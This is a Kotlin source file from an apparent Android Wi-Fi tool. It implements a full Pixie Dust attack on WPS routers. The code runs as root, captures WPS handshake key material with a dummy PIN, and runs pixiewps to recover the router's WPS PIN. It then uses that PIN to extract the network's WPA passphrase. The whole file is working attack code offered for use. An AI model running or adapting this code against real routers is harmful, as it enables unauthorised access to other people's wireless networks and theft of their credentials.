package com.lsd.wififrankenstein.util

import android.content.Context
import com.topjohnwu.superuser.Shell
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.TimeoutCancellationException
import kotlinx.coroutines.async
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader














class NativePixieDustRunner(private val context: Context) {

    private val PIN_REGEX =
        Regex("""(\[\+\]\s*WPS\s*PIN:\s*|\[\+\]\s*WPS\s*pin:\s*)'?([\d]{4,8})'?""")
    private val BSSID_REGEX = Regex("^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")
    private val IFACE_REGEX = Regex("^[a-zA-Z0-9]+$")

    @Volatile
    private var supplicantProcess: Process? = null

    @Volatile
    private var pixieProcess: Process? = null

    @Volatile
    private var wifiDisabledByAttack = false

    @Volatile
    private var cancelled = false

    suspend fun runAttack(
        bssid: String,
        interfaceName: String = "wlan0",
        ssid: String? = null,
        freqMHz: Int? = null,
        disableWifiBeforeAttack: Boolean = true,
        onProgress: ((String) -> Unit)? = null
    ): PixieDustResult {
        return withContext(Dispatchers.IO) {
            val log: (String) -> Unit = { msg ->
                onProgress?.invoke(msg)
                Log.d(TAG, msg)
            }
            try {
                withTimeout(TOTAL_TIMEOUT_MS) {
                    log("[*] ===== PIXIEDUST ATTACK START =====")
                    log(
                        "[*] BSSID: $bssid | Interface: $interfaceName | " +
                                "SSID: $ssid | freq: ${freqMHz ?: "unknown"}"
                    )
                    log(
                        "[*] Arch suffix: ${NativeWifiBinaries.archSuffix()} | " +
                                "ARM: ${NativeWifiBinaries.isArmArchitecture(context)}"
                    )
                    log("[*] Binary dir: ${NativeWifiBinaries.binaryDir(context)}")
                    log("[*] Ctrl dir: ${NativeWifiBinaries.ctrlDir()}")

                    if (!NativeWifiBinaries.isArmArchitecture(context)) {
                        log("[-] Native pixiedust requires ARM architecture")
                        return@withTimeout PixieDustResult(
                            null, null, false,
                            "ERROR: Native pixiedust requires ARM architecture",
                            reason = "Native pixiedust requires an ARM processor"
                        )
                    }
                    if (!BSSID_REGEX.matches(bssid)) {
                        log("[-] Invalid BSSID format: $bssid")
                        return@withTimeout PixieDustResult(
                            null, null, false,
                            "ERROR: Invalid BSSID format: $bssid",
                            reason = "Invalid BSSID format"
                        )
                    }
                    if (!IFACE_REGEX.matches(interfaceName)) {
                        log("[-] Invalid interface name: $interfaceName")
                        return@withTimeout PixieDustResult(
                            null, null, false,
                            "ERROR: Invalid interface name: $interfaceName",
                            reason = "Invalid interface name"
                        )
                    }

                    log("[*] Preparing native binaries...")
                    log(
                        "[*] Using wpa_supplicant=${NativeWifiBinaries.wpaSupplicantAssetName()} " +
                                "wpa_cli=${NativeWifiBinaries.WPA_CLI_32} " +
                                "pixiedust=${NativeWifiBinaries.pixiedustAssetName()}"
                    )
                    if (!NativeWifiBinaries.ensure(context)) {
                        log("[-] Failed to prepare native binaries")
                        return@withTimeout PixieDustResult(
                            null, null, false,
                            "ERROR: Failed to prepare native binaries",
                            reason = "Failed to prepare native binaries"
                        )
                    }
                    log("[+] Native binaries ready: ${NativeWifiBinaries.allBinariesPresent(context)}")

                    if (disableWifiBeforeAttack) {
                        log("[*] Disabling system WiFi (svc wifi disable)...")
                        val wifiOff = Shell.cmd("svc wifi disable").exec()
                        log(
                            "[*] svc wifi disable -> exit=${wifiOff.code} " +
                                    "out=[${wifiOff.out.joinToString(" ")}] err=[${
                                        wifiOff.err.joinToString(
                                            " "
                                        )
                                    }]"
                        )
                        delay(2000)
                        log("[*] Waited 2s for WiFi to release the interface")
                        wifiDisabledByAttack = true
                    } else {
                        log("[*] WiFi not disabled (disabled by user setting)")
                        if (isInterfaceInUse(interfaceName)) {
                            log(
                                "[-] WARNING: interface $interfaceName appears to be held by the system WiFi stack. " +
                                        "The attack may not work. Enable 'Disable WiFi before attack' for best results."
                            )
                        }
                    }





                    var m3: M3Parser.M3Data? = null
                    var m5m7: M3Parser.M5M7Capture? = null
                    var captureReason: String? = null

                    for (round in 1..MAX_ATTACK_ROUNDS) {
                        if (cancelled) {
                            captureReason = "Attack cancelled by user"
                            break
                        }
                        if (round > 1) {
                            log(
                                "[-] M3 capture failed in round ${round - 1}, " +
                                        "restarting supplicant for round $round/$MAX_ATTACK_ROUNDS " +
                                        "(fresh DH keys)..."
                            )
                            killSupplicantProcess()
                            delay(1000)
                        }

                        val reader = startAttackSupplicant(interfaceName, log) ?: run {
                            captureReason =
                                "wpa_supplicant socket was not created (SELinux may be blocking it)"
                            break
                        }

                        val attempt = captureM3WithRetries(
                            reader = reader,
                            bssid = bssid,
                            interfaceName = interfaceName,
                            freqMHz = freqMHz,
                            log = log
                        )
                        m3 = attempt.data
                        m5m7 = attempt.m5m7
                        captureReason = attempt.failureReason
                        if (m3 != null) {
                            log("[+] M3 captured (round $round/$MAX_ATTACK_ROUNDS)")
                            break
                        }
                    }

                    if (m3 == null) {
                        val reason = captureReason
                            ?: "Not enough data to run Pixie Dust attack"
                        log("[-] $reason")
                        return@withTimeout PixieDustResult(
                            null, null, false,
                            "ERROR: Not enough data to run Pixie Dust attack",
                            reason = reason
                        )
                    }
                    log("[+] M3 captured:")
                    log("    E-Nonce: ${m3.enroleeNonce}")
                    log("    PKE (peer key): ${m3.peerPublicKey}")
                    log("    PKR (own key): ${m3.ownPublicKey}")
                    log("    AuthKey: ${m3.authKey}")
                    log("    E-Hash1: ${m3.eHash1}")
                    log("    E-Hash2: ${m3.eHash2}")
                    val mode3 = m5m7
                    val useMode3 = mode3 != null && mode3.hasBoth()
                    if (useMode3) {
                        log(
                            "[*] Pixiewps mode 3 (RTL819x): M5=${mode3.m5Enc?.length ?: 0} hex, " +
                                    "M7=${mode3.m7Enc?.length ?: 0} hex"
                        )
                    } else {
                        log("[*] Pixiewps args: ${m3.toPixiewpsArgs()}")
                    }

                    log("[*] Running pixiewps ...")
                    val pixieCmd = buildPixieCommand(m3, m5m7)
                    log("[*] Pixiewps command: $pixieCmd")
                    pixieProcess = Runtime.getRuntime().exec(arrayOf("su", "-c", pixieCmd))
                    log("[*] pixiewps started")
                    val pixieReader = BufferedReader(InputStreamReader(pixieProcess!!.inputStream))
                    val pixieErrReader =
                        BufferedReader(InputStreamReader(pixieProcess!!.errorStream))
                    val rawOutput = StringBuilder()
                    var wpsPin: String? = null

                    val stderrDeferred = async(Dispatchers.IO) {
                        val sb = StringBuilder()
                        while (true) {
                            val l = pixieErrReader.readLine() ?: break
                            sb.append(l).append('\n')
                            log("[pixiewps-stderr] $l")
                        }
                        sb.toString()
                    }

                    while (true) {
                        val line = pixieReader.readLine() ?: break
                        rawOutput.append(line).append('\n')
                        log(line)
                        if (!line.contains("not found", ignoreCase = true)) {
                            val m = PIN_REGEX.find(line)
                            if (m != null) {
                                wpsPin = m.groups[2]?.value
                            }
                        }
                    }

                    val exitCode = pixieProcess!!.waitFor()
                    log("[*] pixiewps exit code: $exitCode")
                    val stderrOut = stderrDeferred.await()
                    if (stderrOut.isNotEmpty()) rawOutput.append(stderrOut)

                    val success = wpsPin != null
                    log(if (success) "[+] WPS PIN found: $wpsPin" else "[-] WPS pin not found!")

                    var wpaPsk: String? = null
                    if (wpsPin != null && !ssid.isNullOrBlank()) {
                        wpaPsk = obtainWpsPsk(bssid, interfaceName, ssid, wpsPin, freqMHz, log)
                        if (wpaPsk != null) {
                            log("[+] WPA PSK obtained: $wpaPsk")
                        } else {
                            log("[-] WPA PSK not obtained")
                        }
                    } else if (success) {
                        log("[*] Skipping PSK extraction (SSID unknown or empty)")
                    }

                    log("PIXIE_DONE")
                    if (success) {
                        PixieDustResult(wpsPin, wpaPsk, true, rawOutput.toString())
                    } else {
                        PixieDustResult(
                            null, null, false, rawOutput.toString(),
                            reason = "All WPS data was collected and pixiewps completed the calculation, " +
                                    "but the target is not vulnerable to the Pixie Dust attack (WPS pin not found)."
                        )
                    }
                }
            } catch (e: TimeoutCancellationException) {
                Log.w(TAG, "Native pixiedust timed out")
                PixieDustResult(
                    null, null, false,
                    "TIMEOUT: Native pixiedust exceeded time limit",
                    reason = "Attack timed out. The router may have WPS locked or disabled."
                )
            } catch (e: kotlinx.coroutines.CancellationException) {
                throw e
            } catch (e: Exception) {
                Log.e(TAG, "Native pixiedust failed", e)
                PixieDustResult(
                    null, null, false, "ERROR: ${e.message}",
                    reason = "Unexpected error: ${e.message}"
                )
            } finally {
                cleanup(log)
            }
        }
    }





    private fun startAttackSupplicant(iface: String, log: (String) -> Unit): BufferedReader? {
        val ctrlDir = NativeWifiBinaries.ctrlDir()
        log("[*] Preparing ctrl dir: $ctrlDir")
        val rmCtrl = Shell.cmd("rm -rf $ctrlDir 2>/dev/null").exec()
        log("[*] rm -rf $ctrlDir -> exit=${rmCtrl.code}")
        val mkCtrl = Shell.cmd("mkdir -p $ctrlDir 2>/dev/null").exec()
        log("[*] mkdir -p $ctrlDir -> exit=${mkCtrl.code}")
        val chCtrl = Shell.cmd("chmod 777 $ctrlDir 2>/dev/null").exec()
        log("[*] chmod 777 $ctrlDir -> exit=${chCtrl.code}")

        log("[*] Starting own wpa_supplicant (debug -d -K)...")
        val suppCmd = buildSupplicantCommand(iface, ctrlDir)
        log("[*] Supplicant command: $suppCmd")
        supplicantProcess = Runtime.getRuntime().exec(arrayOf("su", "-c", suppCmd))
        log("[*] wpa_supplicant started")
        val reader = BufferedReader(InputStreamReader(supplicantProcess!!.inputStream))

        val socketPath = "$ctrlDir/$iface"
        if (!waitForSocket(socketPath, 8000, log)) {
            log("[-] wpa_supplicant socket not created (SELinux may block): $socketPath")
            return null
        }
        if (!waitForInterfaceReady(iface, ctrlDir, log)) {
            log("[-] wpa_supplicant ctrl interface not ready to serve commands")
            return null
        }
        return reader
    }






    private fun waitForInterfaceReady(
        iface: String,
        ctrlDir: String,
        log: (String) -> Unit = {}
    ): Boolean {
        val dir = NativeWifiBinaries.binaryDir(context)
        val wpaCli = "./${NativeWifiBinaries.WPA_CLI_32}"
        log("[*] Waiting for wpa_supplicant ctrl interface readiness (wpa_cli ping)...")
        val start = System.currentTimeMillis()
        val deadline = start + 8000L
        while (System.currentTimeMillis() < deadline) {
            if (cancelled) return false
            val r = runWithTimeout(
                "cd $dir && export LD_LIBRARY_PATH=$dir && $wpaCli -p$ctrlDir -i $iface ping",
                3
            )
            logResult("wpa_cli (ping)", r, log)
            if (r != null && r.isSuccess && r.out.any { it.trim() == "PONG" }) {
                log(
                    "[+] wpa_supplicant ctrl interface ready (PONG, " +
                            "${System.currentTimeMillis() - start}ms)"
                )
                return true
            }
            Thread.sleep(250)
        }
        log(
            "[-] wpa_supplicant ctrl interface not ready (no PONG, " +
                    "${System.currentTimeMillis() - start}ms)"
        )
        return false
    }

    private fun buildSupplicantCommand(
        iface: String,
        ctrlDir: String,
        sleepSeconds: Int = 110
    ): String {
        val dir = NativeWifiBinaries.binaryDir(context)
        val supplicant = NativeWifiBinaries.wpaSupplicantAssetName()
        val conf = "$dir/${NativeWifiBinaries.WPA_SUPPLICANT_CONF}"
        val sb = StringBuilder()
        sb.append("export LD_LIBRARY_PATH=").append(dir).append("; ")
        sb.append(dir).append('/').append(supplicant)
            .append(" -d -Dnl80211,wext,hostapd,wired -i ").append(iface)
            .append(" -c").append(conf)
            .append(" -K -O").append(ctrlDir)
            .append(" & pid=\$!; ( sleep $sleepSeconds; kill \$pid 2>/dev/null ) & wait \$pid")
        return sb.toString()
    }

    private fun buildPixieCommand(
        m3: M3Parser.M3Data,
        m5m7: M3Parser.M5M7Capture?
    ): String {
        val dir = NativeWifiBinaries.binaryDir(context)
        val pixie = NativeWifiBinaries.pixiedustAssetName()
        return if (m5m7 != null && m5m7.hasBoth()) {
            "$dir/$pixie ${m5m7.toPixiewpsMode3Args(m3)}"
        } else {
            "$dir/$pixie --force ${m3.toPixiewpsArgs()}"
        }
    }

    private fun sendWpsReg(
        bssid: String,
        iface: String,
        freqMHz: Int?,
        log: (String) -> Unit
    ): Shell.Result? {
        return sendWpaCli32Variants(iface, bssid, freqMHz, log)
    }

    private fun sendWpaCli32Variants(
        iface: String,
        bssid: String,
        freqMHz: Int?,
        log: (String) -> Unit
    ): Shell.Result? {
        val dir = NativeWifiBinaries.binaryDir(context)
        val ctrlDir = NativeWifiBinaries.ctrlDir()
        val wpaCli = "./${NativeWifiBinaries.WPA_CLI_32}"

        fun cli(cmd: String): Shell.Result? =
            runWithTimeout(
                "cd $dir && export LD_LIBRARY_PATH=$dir && $wpaCli -p$ctrlDir -i $iface $cmd",
                5
            )





        val freqSuffix = if (freqMHz != null) " freq=$freqMHz" else ""
        val regCmd = cli("wps_reg $bssid 12345670$freqSuffix")
        log("[*] wpa_cli (wps_reg): $regCmd")
        logResult("wpa_cli (wps_reg)", regCmd, log)
        return regCmd
    }






    private fun isWpsRegAccepted(result: Shell.Result?): Boolean {
        return result != null && result.isSuccess &&
                result.out.any { it.trim() == "OK" }
    }

    private fun logResult(label: String, result: Shell.Result?, log: (String) -> Unit) {
        if (result == null) {
            log("[-] $label -> command failed/timed out")
        } else {
            val out = result.out.joinToString(" ").ifEmpty { "(no stdout)" }
            val err = result.err.joinToString(" ").ifEmpty { "(no stderr)" }
            log(
                "[*] $label -> exit=${result.code} success=${result.isSuccess} " +
                        "out=[$out] err=[$err]"
            )
        }
    }

    private fun runWithTimeout(command: String, timeoutSeconds: Int): Shell.Result? {
        return try {
            val wrapped =
                "($command & pid=\$!; ( sleep $timeoutSeconds; kill \$pid 2>/dev/null ) & wait \$pid)"
            Shell.cmd(wrapped).exec()
        } catch (e: Exception) {
            Log.w(TAG, "Command failed/timed out: $command", e)
            null
        }
    }

    private fun waitForSocket(
        socketPath: String,
        timeoutMs: Long,
        log: (String) -> Unit = {}
    ): Boolean {
        log("[*] Waiting for wpa_supplicant socket: $socketPath (${timeoutMs}ms timeout)...")
        val start = System.currentTimeMillis()
        val deadline = start + timeoutMs
        var attempts = 0
        while (System.currentTimeMillis() < deadline) {
            attempts++
            try {
                val r = Shell.cmd("test -S $socketPath && echo OK").exec()
                if (r.out.any { it.trim() == "OK" }) {
                    log(
                        "[+] Socket ready: $socketPath " +
                                "(attempt $attempts, ${System.currentTimeMillis() - start}ms)"
                    )
                    return true
                }
            } catch (e: Exception) {
                Log.w(TAG, "Socket check error", e)
            }
            if (attempts % 4 == 0) {
                log(
                    "[*]   ... still waiting for socket " +
                            "($socketPath, ${System.currentTimeMillis() - start}ms elapsed)"
                )
            }
            Thread.sleep(300)
        }
        log("[-] Socket wait timed out: $socketPath (${attempts} attempts)")
        return false
    }

    private suspend fun obtainWpsPsk(
        bssid: String,
        iface: String,
        ssid: String,
        pin: String,
        freqMHz: Int?,
        log: (String) -> Unit
    ): String? {
        return withContext(Dispatchers.IO) {
            withTimeout(45_000L) {
                try {
                    log("[*] ===== WPA PSK EXTRACTION (WPS with computed PIN $pin) =====")

                    try {
                        supplicantProcess?.destroy()
                    } catch (_: Exception) {
                    }
                    pkillByDir()

                    val ctrlDir = NativeWifiBinaries.ctrlDir()
                    Shell.cmd("rm -rf $ctrlDir 2>/dev/null").exec()
                    Shell.cmd("mkdir -p $ctrlDir 2>/dev/null").exec()
                    Shell.cmd("chmod 777 $ctrlDir 2>/dev/null").exec()

                    log("[*] Starting fresh wpa_supplicant for WPS provisioning...")
                    val suppCmd = buildSupplicantCommand(iface, ctrlDir, sleepSeconds = 110)
                    log("[*] Supplicant command: $suppCmd")
                    supplicantProcess = Runtime.getRuntime().exec(arrayOf("su", "-c", suppCmd))
                    val reader = BufferedReader(InputStreamReader(supplicantProcess!!.inputStream))
                    val drainer = async(Dispatchers.IO) {
                        while (true) {
                            val l = reader.readLine() ?: break
                            log("[supplicant] $l")
                        }
                    }

                    val socketPath = "$ctrlDir/$iface"
                    if (!waitForSocket(socketPath, 8000, log)) {
                        log("[-] PSK stage: supplicant socket not created")
                        drainer.cancel()
                        return@withTimeout null
                    }

                    val dir = NativeWifiBinaries.binaryDir(context)
                    val wpaCli = "./${NativeWifiBinaries.WPA_CLI_32}"
                    fun cli(cmd: String): Shell.Result? =
                        runWithTimeout(
                            "cd $dir && export LD_LIBRARY_PATH=$dir && $wpaCli -p$ctrlDir -i $iface $cmd",
                            5
                        )

                    var netId = "0"
                    log("[*] wpa_cli add_network...")
                    val addRes = cli("add_network")
                    logResult("add_network", addRes, log)
                    addRes?.out?.firstOrNull { it.trim().toIntOrNull() != null }?.let {
                        netId = it.trim()
                    }
                    log("[+] PSK stage: network id = $netId")

                    logResult("set_network ssid", cli("set_network $netId ssid \"$ssid\""), log)
                    logResult(
                        "set_network key_mgmt",
                        cli("set_network $netId key_mgmt WPA-PSK"),
                        log
                    )
                    log("[*] wpa_cli wps_reg $bssid $pin ...")
                    val freqSuffix = if (freqMHz != null) " freq=$freqMHz" else ""
                    logResult("wps_reg", cli("wps_reg $bssid $pin$freqSuffix"), log)
                    logResult("select_network", cli("select_network $netId"), log)

                    log("[*] Waiting for WPS provisioning & PSK (up to 25s)...")
                    var psk: String? = null
                    val deadline = System.currentTimeMillis() + 25_000L
                    while (System.currentTimeMillis() < deadline) {
                        val found = listOf(
                            extractPskValue(cli("get_network $netId psk")),
                            extractPskValue(cli("get_network 0 psk"))
                        ).firstOrNull { !it.isNullOrEmpty() }
                        if (found != null) {
                            psk = found
                            break
                        }
                        delay(1000)
                    }

                    if (psk == null) {
                        log("[*] PSK not in control interface — trying save_config...")
                        logResult("save_config", cli("save_config"), log)
                        psk = parsePskFromConfig(dir)
                    }

                    drainer.cancel()
                    if (psk != null) {
                        log("[+] WPA PSK: $psk")
                    } else {
                        log("[-] No PSK obtained from WPS exchange")
                    }
                    psk
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    Log.e(TAG, "PSK extraction failed", e)
                    log("[-] PSK extraction error: ${e.message}")
                    null
                }
            }
        }
    }

    private fun extractPskValue(result: Shell.Result?): String? {
        if (result == null) return null
        val line = result.out.firstOrNull { l ->
            val t = l.trim()
            t.isNotEmpty() &&
                    t != "OK" &&
                    !t.startsWith("Selected interface") &&
                    !t.startsWith("Using interface") &&
                    !t.contains("UNKNOWN COMMAND", ignoreCase = true) &&
                    !t.contains("FAIL", ignoreCase = true)
        } ?: return null
        val v = line.trim().removePrefix("psk=").trim('"').trim()
        return v.ifEmpty { null }
    }

    private fun parsePskFromConfig(dir: String): String? {
        val conf = File(dir, NativeWifiBinaries.WPA_SUPPLICANT_CONF)
        if (!conf.exists()) return null
        return try {
            conf.readLines()
                .map { it.trim() }
                .filter { it.startsWith("psk=") }
                .map { it.removePrefix("psk=").trim('"').trim() }
                .firstOrNull { it.isNotEmpty() && !it.contains("FAIL", ignoreCase = true) }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to parse psk from config", e)
            null
        }
    }

    fun cancel() {
        Log.d(TAG, "Native pixiedust cancel requested")
        cancelled = true
        cleanup()
    }







    private suspend fun captureM3WithRetries(
        reader: BufferedReader,
        bssid: String,
        interfaceName: String,
        freqMHz: Int?,
        log: (String) -> Unit
    ): M3Attempt {
        val maxAttempts = 3
        var lastIncomplete: M3Parser.M3Capture.Incomplete? = null
        var lastRegResult: Shell.Result? = null
        var anyRegAccepted = false
        for (attempt in 1..maxAttempts) {
            if (cancelled) return M3Attempt(null, "Attack cancelled by user")
            if (attempt > 1) {
                log("[-] M3 incomplete, retrying wps_reg (attempt $attempt/$maxAttempts)...")
                delay(1000)
            }
            log("[*] Sending wps_reg with PIN 12345670...")
            val regResult = sendWpsReg(bssid, interfaceName, freqMHz, log)
            lastRegResult = regResult
            if (!isWpsRegAccepted(regResult)) {
                log(
                    "[-] wps_reg not accepted (exit=${regResult?.code}), " +
                            "retrying in 750ms (attempt $attempt/$maxAttempts)..."
                )
                delay(750)
                continue
            }
            anyRegAccepted = true

            log("[*] Capturing M3 fields...")
            var m5m7: M3Parser.M5M7Capture? = null
            val capture = withTimeout(30_000L) {
                M3Parser.parse(
                    reader,
                    timeoutMs = 25_000L,
                    cancelRequested = { cancelled },
                    onLine = { line -> log("[supplicant] $line") },
                    onM5M7 = { d ->
                        m5m7 = d
                        log(
                            "[*] WPS-M5/M7 captured (Pixie mode 3 data): " +
                                    "M5=${d.m5Enc?.length ?: 0} hex, M7=${d.m7Enc?.length ?: 0} hex, " +
                                    "BSSID=${d.bssid.ifEmpty { "unknown" }}"
                        )
                    }
                )
            }
            when (capture) {
                is M3Parser.M3Capture.Complete ->
                    return M3Attempt(capture.data, null, m5m7)

                is M3Parser.M3Capture.Incomplete -> {
                    lastIncomplete = capture
                    log(
                        "[-] M3 capture incomplete: ${capture.capturedCount}/6, " +
                                "missing: ${capture.missing.joinToString()}"
                    )
                }
            }
        }
        val reason = when {
            !anyRegAccepted -> {
                val code = lastRegResult?.code
                "wpa_supplicant did not accept wps_reg " +
                        (if (code != null) "(exit=$code)" else "(no reply)") +
                        ". Possible causes: interface not ready, WPS disabled on the router, or WPS locked."
            }

            lastIncomplete != null ->
                "WPS data capture incomplete after $maxAttempts attempts " +
                        "(${lastIncomplete.capturedCount}/6 fields, " +
                        "missing: ${lastIncomplete.missing.joinToString(", ")}). " +
                        "Possible causes: weak signal, WPS disabled on the router, or WPS locked."

            else -> "WPS data capture failed"
        }
        return M3Attempt(null, reason)
    }





    private fun killSupplicantProcess() {
        try {
            supplicantProcess?.destroy()
        } catch (_: Exception) {
        }
        supplicantProcess = null
        pkillByDir()
    }






    private fun pkillByDir(): Shell.Result {
        val dir = NativeWifiBinaries.binaryDir(context)
        val r = Shell.cmd("pkill -9 -f $dir 2>/dev/null").exec()
        if (r.code == 127) {
            return Shell.cmd("$dir/busybox pkill -9 -f $dir 2>/dev/null").exec()
        }
        return r
    }

    private data class M3Attempt(
        val data: M3Parser.M3Data?,
        val failureReason: String?,
        val m5m7: M3Parser.M5M7Capture? = null
    )






    private fun isInterfaceInUse(iface: String): Boolean {
        return try {
            val sysSocket = WpsSocketUtils.findControlSocketDir(iface) != null
            val wifiManager =
                context.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            sysSocket || wifiManager.isWifiEnabled
        } catch (e: Exception) {
            Log.w(TAG, "isInterfaceInUse check failed", e)
            false
        }
    }

    private fun cleanup(log: (String) -> Unit = {}) {
        try {
            val supp = supplicantProcess
            if (supp != null) {
                log("[*] Cleanup: destroying wpa_supplicant")
                supp.destroy()
            }
        } catch (_: Exception) {
        }
        try {
            val pix = pixieProcess
            if (pix != null) {
                log("[*] Cleanup: destroying pixiewps")
                pix.destroy()
            }
        } catch (_: Exception) {
        }
        supplicantProcess = null
        pixieProcess = null

        val dir = NativeWifiBinaries.binaryDir(context)
        val kill = pkillByDir()
        log("[*] Cleanup: pkill -9 -f $dir -> exit=${kill.code}")
        val rm = Shell.cmd("rm -rf ${NativeWifiBinaries.ctrlDir()} 2>/dev/null").exec()
        log("[*] Cleanup: rm -rf ${NativeWifiBinaries.ctrlDir()} -> exit=${rm.code}")
        if (wifiDisabledByAttack) {
            val wifi = Shell.cmd("svc wifi enable 2>/dev/null").exec()
            log("[*] Cleanup: svc wifi enable -> exit=${wifi.code}")
        } else {
            log("[*] Cleanup: WiFi was not disabled by this attack, leaving state unchanged")
        }
        wifiDisabledByAttack = false
        log("[*] Cleanup done")
    }

    companion object {
        private const val TAG = "NativePixieDustRunner"
        private const val TOTAL_TIMEOUT_MS = 240_000L
        private const val MAX_ATTACK_ROUNDS = 3
    }
}
